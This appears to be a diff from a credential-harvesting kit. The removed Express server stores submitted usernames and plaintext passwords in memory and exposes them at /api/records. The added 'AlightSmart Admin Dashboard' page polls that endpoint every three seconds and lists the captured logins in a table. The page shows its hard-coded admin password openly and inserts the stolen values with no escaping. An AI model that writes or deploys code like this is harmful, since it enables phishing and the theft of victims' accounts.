@@ -1,40 +1,69 @@
-const express = require('express');
-const path = require('path');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlightSmart Admin</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 1200px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #e2e8f0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 AlightSmart Admin Dashboard</h1>
+            <p>Password: tunde6035</p>
+        </div>
 
-const app = express();
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+        <table id="recordsTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Type</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
 
-// Simple in-memory storage
-let records = [];
+    <script>
+        const ADMIN_PASSWORD = "tunde6035";
 
-// Save login
-app.post('/api/login', (req, res) => {
-    const { username, password } = req.body;
-    records.push({
-        type: 'Login',
-        username,
-        password,
-        time: new Date().toLocaleString()
-    });
-    console.log('Login Saved:', username);
-    res.json({ success: true });
-});
+        async function loadRecords() {
+            const res = await fetch('/api/records');
+            const records = await res.json();
+            const tbody = document.querySelector('#recordsTable tbody');
+            tbody.innerHTML = "";
 
-// Get records
-app.get('/api/records', (req, res) => {
-    res.json(records);
-});
+            records.forEach(r => {
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${r.timestamp}</td>
+                        <td>${r.type}</td>
+                        <td><strong>${r.username || '-'}</strong></td>
+                        <td>${r.password ? `<code>${r.password}</code>` : '-'}</td>
+                    </tr>`;
+            });
+        }
 
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running on port ${PORT}`);
-});
+        window.onload = () => {
+            const pass = prompt("Enter Admin Password:");
+            if (pass === ADMIN_PASSWORD) {
+                loadRecords();
+                setInterval(loadRecords, 3000);
+            } else {
+                alert("Wrong Password");
+                window.location.href = "/";
+            }
+        };
+    </script>
+</body>
+</html>
